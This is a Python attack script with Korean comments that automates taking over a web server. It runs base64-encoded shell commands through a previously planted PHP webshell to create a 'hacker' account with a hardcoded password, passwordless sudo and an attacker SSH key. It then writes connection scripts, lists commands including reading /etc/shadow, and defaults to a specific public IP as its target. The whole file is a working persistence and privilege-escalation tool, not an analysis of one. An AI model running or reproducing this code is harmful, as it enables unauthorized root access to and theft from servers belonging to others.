#!/usr/bin/env python3
"""
백도어 접근 권한 생성
공격자 로컬에서 실행하여 타겟 서버에 백도어 계정을 자동으로 생성합니다.
"""

import requests
import time
import sys
import subprocess
import os
from pathlib import Path

class BackdoorAccess:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_url = f"{self.base_url}/www/api/system.php"

        # SSH 키 경로
        self.ssh_key_path = Path.home() / '.ssh' / 'hacker_backdoor'
        self.ssh_pub_key_path = Path(str(self.ssh_key_path) + '.pub')

        # 백도어 사용자 정보
        self.backdoor_user = "hacker"
        self.backdoor_pass = "H4ck3r!P@ssw0rd2024"

        # 세션 설정 (Tor 없이 직접 연결)
        self.session = requests.Session()

        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def print_banner(self):
        print("╔" + "═"*68 + "╗")
        print("║" + " "*68 + "║")
        print("║" + "  백도어 접근 권한 생성 - 서버 완전 장악".center(76) + "║")
        print("║" + " "*68 + "║")
        print("╚" + "═"*68 + "╝")
        print()
        print(f"[*] 타겟: {self.target_ip}")
        print(f"[*] 백도어 사용자: {self.backdoor_user}")
        print()

    def check_webshell_access(self):
        """웹쉘 접근 가능 여부 확인"""
        print("[1] 백도어 웹쉘 접근 확인 중...")
        print()

        try:
            params = {'cmd': 'whoami'}
            resp = self.session.get(self.webshell_url, params=params, timeout=15)

            if resp.status_code == 200 and 'apache' in resp.text.lower():
                print("[+] ✅ 웹쉘 접근 성공!")
                print(f"[+] 현재 권한: apache")
                print()
                return True
            else:
                print("[-] 웹쉘 접근 실패")
                print("[*] 먼저 defacewebsite.sh를 실행하여 .system.php를 생성하세요")
                return False

        except Exception as e:
            print(f"[-] 웹쉘 접근 오류: {str(e)}")
            return False

    def generate_ssh_key(self):
        """SSH 키 생성"""
        print("[2] SSH 키 생성 중...")
        print()

        # 기존 키 삭제
        if self.ssh_key_path.exists():
            print("[*] 기존 SSH 키 발견, 사용합니다...")
            with open(self.ssh_pub_key_path, 'r') as f:
                pub_key = f.read().strip()
            print(f"[+] 공개키: {pub_key[:50]}...")
            print()
            return pub_key

        # 새 키 생성
        print("[*] 새 SSH 키 생성 중...")
        try:
            subprocess.run([
                'ssh-keygen', '-t', 'rsa', '-b', '2048',
                '-f', str(self.ssh_key_path),
                '-N', '',  # 패스워드 없음
                '-C', f'{self.backdoor_user}@attacker'
            ], check=True, capture_output=True)

            print(f"[+] SSH 키 생성 완료: {self.ssh_key_path}")

            # 권한 설정
            os.chmod(self.ssh_key_path, 0o600)

            # 공개키 읽기
            with open(self.ssh_pub_key_path, 'r') as f:
                pub_key = f.read().strip()

            print(f"[+] 공개키: {pub_key[:50]}...")
            print()

            return pub_key

        except subprocess.CalledProcessError as e:
            print(f"[-] SSH 키 생성 실패: {str(e)}")
            return None

    def execute_webshell_command(self, command):
        """웹쉘을 통한 명령어 실행"""
        try:
            # 명령어를 base64로 인코딩 (특수 문자 문제 회피)
            import base64
            cmd_b64 = base64.b64encode(command.encode()).decode()

            # echo로 디코딩 후 실행
            full_cmd = f"echo {cmd_b64} | base64 -d | bash"

            params = {'cmd': full_cmd}
            resp = self.session.get(self.webshell_url, params=params, timeout=30)

            if resp.status_code == 200:
                # HTML 태그 제거
                result = resp.text.replace('<pre>', '').replace('</pre>', '').strip()
                return result
            else:
                return None

        except Exception as e:
            print(f"[-] 명령어 실행 오류: {str(e)}")
            return None

    def create_backdoor_user(self, ssh_pub_key):
        """백도어 사용자 생성"""
        print("[3] 백도어 사용자 생성 중...")
        print()

        # 사용자 생성 스크립트
        script = f"""
# 1. 사용자 생성
sudo useradd -m -s /bin/bash {self.backdoor_user} 2>/dev/null || echo "User exists"

# 2. 비밀번호 설정
echo '{self.backdoor_user}:{self.backdoor_pass}' | sudo chpasswd

# 3. sudo 권한 부여
echo '{self.backdoor_user} ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/{self.backdoor_user} > /dev/null
sudo chmod 440 /etc/sudoers.d/{self.backdoor_user}

# 4. SSH 키 설정
sudo mkdir -p /home/{self.backdoor_user}/.ssh
sudo chmod 700 /home/{self.backdoor_user}/.ssh
echo '{ssh_pub_key}' | sudo tee /home/{self.backdoor_user}/.ssh/authorized_keys > /dev/null
sudo chmod 600 /home/{self.backdoor_user}/.ssh/authorized_keys
sudo chown -R {self.backdoor_user}:{self.backdoor_user} /home/{self.backdoor_user}/.ssh

# 5. 확인
id {self.backdoor_user}
sudo cat /etc/sudoers.d/{self.backdoor_user}
"""

        result = self.execute_webshell_command(script)

        if result and self.backdoor_user in result:
            print("[+] ✅ 백도어 사용자 생성 성공!")
            print()
            print(f"[+] 사용자명: {self.backdoor_user}")
            print(f"[+] 비밀번호: {self.backdoor_pass}")
            print(f"[+] 권한: sudo (NOPASSWD)")
            print()
            return True
        else:
            print("[-] 백도어 사용자 생성 실패")
            if result:
                print(f"[*] 응답: {result[:200]}")
            return False

    def test_ssh_access(self):
        """SSH 접근 테스트"""
        print("[4] SSH 접근 테스트 중...")
        print()

        try:
            # SSH 명령어 실행
            cmd = [
                'ssh',
                '-i', str(self.ssh_key_path),
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                '-o', 'ConnectTimeout=10',
                f'{self.backdoor_user}@{self.target_ip}',
                'whoami && id && sudo whoami'
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)

            if result.returncode == 0:
                print("[+] ✅ SSH 접근 성공!")
                print()
                print("[+] 명령어 실행 결과:")
                print(result.stdout)
                print()
                return True
            else:
                print("[-] SSH 접근 실패")
                print(f"[*] 오류: {result.stderr[:200]}")
                return False

        except subprocess.TimeoutExpired:
            print("[-] SSH 연결 시간 초과")
            return False
        except Exception as e:
            print(f"[-] SSH 접근 오류: {str(e)}")
            return False

    def create_connection_script(self):
        """연결 스크립트 생성"""
        print("[5] 연결 스크립트 생성 중...")
        print()

        script_content = f"""#!/bin/bash
# 백도어 접근 스크립트
# 생성 시각: {time.strftime('%Y-%m-%d %H:%M:%S')}

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   백도어 서버 접속                                        ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

echo "[*] 타겟: {self.target_ip}"
echo "[*] 사용자: {self.backdoor_user}"
echo ""

# SSH 접속
ssh -i {self.ssh_key_path} \\
    -o StrictHostKeyChecking=no \\
    -o UserKnownHostsFile=/dev/null \\
    {self.backdoor_user}@{self.target_ip}
"""

        script_path = Path('connect_backdoor.sh')
        with open(script_path, 'w') as f:
            f.write(script_content)

        os.chmod(script_path, 0o755)

        print(f"[+] 연결 스크립트: {script_path}")
        print()

        # 간단한 연결 명령어도 생성
        cmd_file = Path('backdoor_commands.txt')
        commands = f"""# 백도어 서버 접근 명령어

# 1. SSH 접속 (키 파일 사용)
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip}

# 2. SSH 접속 (비밀번호 사용)
ssh {self.backdoor_user}@{self.target_ip}
# 비밀번호: {self.backdoor_pass}

# 3. 루트 권한으로 명령 실행
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo whoami'

# 4. 원격 명령 실행
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo cat /etc/shadow'

# 5. 연결 스크립트 실행
bash connect_backdoor.sh

# 6. 웹쉘 URL
{self.webshell_url}?cmd=whoami
"""

        with open(cmd_file, 'w') as f:
            f.write(commands)

        print(f"[+] 명령어 파일: {cmd_file}")
        print()

    def save_evidence(self):
        """증거 저장"""
        print("[6] 접근 증거 수집 중...")
        print()

        evidence = []

        # 1. SSH 접속 테스트
        try:
            cmd = [
                'ssh',
                '-i', str(self.ssh_key_path),
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                f'{self.backdoor_user}@{self.target_ip}',
                'whoami && hostname && id && sudo -l && ls -la /home && cat /etc/passwd | grep hacker'
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            evidence.append(("SSH 접속 및 권한 확인", result.stdout))

        except:
            pass

        # 2. 웹쉘을 통한 확인
        try:
            result = self.execute_webshell_command(f"cat /etc/passwd | grep {self.backdoor_user}")
            evidence.append(("/etc/passwd 확인", result))

            result = self.execute_webshell_command(f"sudo cat /etc/sudoers.d/{self.backdoor_user}")
            evidence.append(("sudoers 확인", result))

            result = self.execute_webshell_command(f"ls -la /home/{self.backdoor_user}/.ssh/")
            evidence.append(("SSH 키 확인", result))

        except:
            pass

        # 증거 파일 저장
        timestamp = int(time.time())
        evidence_file = f"backdoor_evidence_{timestamp}.txt"

        with open(evidence_file, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("백도어 접근 증거\n")
            f.write(f"생성 시각: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"타겟: {self.target_ip}\n")
            f.write(f"백도어 사용자: {self.backdoor_user}\n")
            f.write("=" * 70 + "\n\n")

            for title, content in evidence:
                f.write(f"\n{'='*70}\n")
                f.write(f"{title}\n")
                f.write(f"{'='*70}\n")
                f.write(content if content else "(내용 없음)")
                f.write("\n\n")

        print(f"[+] 증거 파일: {evidence_file}")
        print()

    def run(self):
        """전체 공격 실행"""
        self.print_banner()

        # Step 1: 웹쉘 확인
        if not self.check_webshell_access():
            print("[-] 공격 실패: 웹쉘 접근 불가")
            print()
            print("[!] 먼저 다음을 실행하세요:")
            print("    1. defacewebsite.sh 실행 (웹쉘 생성)")
            print("    2. 웹사이트가 변조되었는지 확인")
            print(f"    3. {self.webshell_url}?cmd=whoami 테스트")
            return False

        # Step 2: SSH 키 생성
        ssh_pub_key = self.generate_ssh_key()
        if not ssh_pub_key:
            print("[-] 공격 실패: SSH 키 생성 불가")
            return False

        # Step 3: 백도어 사용자 생성
        if not self.create_backdoor_user(ssh_pub_key):
            print("[-] 공격 실패: 백도어 사용자 생성 불가")
            return False

        # Step 4: SSH 접근 테스트
        time.sleep(2)  # 사용자 생성 완료 대기
        if not self.test_ssh_access():
            print("[-] SSH 접근 실패 (하지만 사용자는 생성됨)")
            print()
            print("[*] 수동으로 접속 시도:")
            print(f"    ssh {self.backdoor_user}@{self.target_ip}")
            print(f"    비밀번호: {self.backdoor_pass}")

        # Step 5: 연결 스크립트 생성
        self.create_connection_script()

        # Step 6: 증거 수집
        self.save_evidence()

        # 성공!
        print()
        print("╔" + "═"*68 + "╗")
        print("║  ✅ 백도어 접근 권한 생성 완료!                                      ║")
        print("╚" + "═"*68 + "╝")
        print()
        print("[+] 이제 이 서버에 언제든지 접속할 수 있습니다!")
        print()
        print("=" * 70)
        print("접속 방법:")
        print("=" * 70)
        print()
        print("1. 스크립트 실행:")
        print(f"   bash connect_backdoor.sh")
        print()
        print("2. 직접 SSH 명령어:")
        print(f"   ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip}")
        print()
        print("3. 비밀번호로 접속:")
        print(f"   ssh {self.backdoor_user}@{self.target_ip}")
        print(f"   비밀번호: {self.backdoor_pass}")
        print()
        print("4. 원격 명령 실행:")
        print(f"   ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo whoami'")
        print()
        print("=" * 70)
        print()
        print("[*] 공격 요약:")
        print("    1. 웹쉘 (.system.php) 을 통해 apache 권한 획득")
        print("    2. apache가 sudo 권한을 가지고 있어 새 사용자 생성 가능")
        print(f"    3. {self.backdoor_user} 사용자 생성 (sudo NOPASSWD 권한)")
        print("    4. SSH 공개키 등록으로 비밀번호 없이 접속 가능")
        print("    5. sudo whoami → root 권한 획득")
        print("    6. 이제 서버는 완전히 장악됨!")
        print()

        return True

def main():
    print()

    if len(sys.argv) < 2:
        print("=" * 70)
        print("백도어 접근 권한 생성")
        print("=" * 70)
        print()

        target_ip = input("타겟 IP 주소 (기본: 52.79.240.83): ").strip()
        if not target_ip:
            target_ip = "52.79.240.83"

        print()
    else:
        target_ip = sys.argv[1]

    backdoor = BackdoorAccess(target_ip)
    success = backdoor.run()

    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
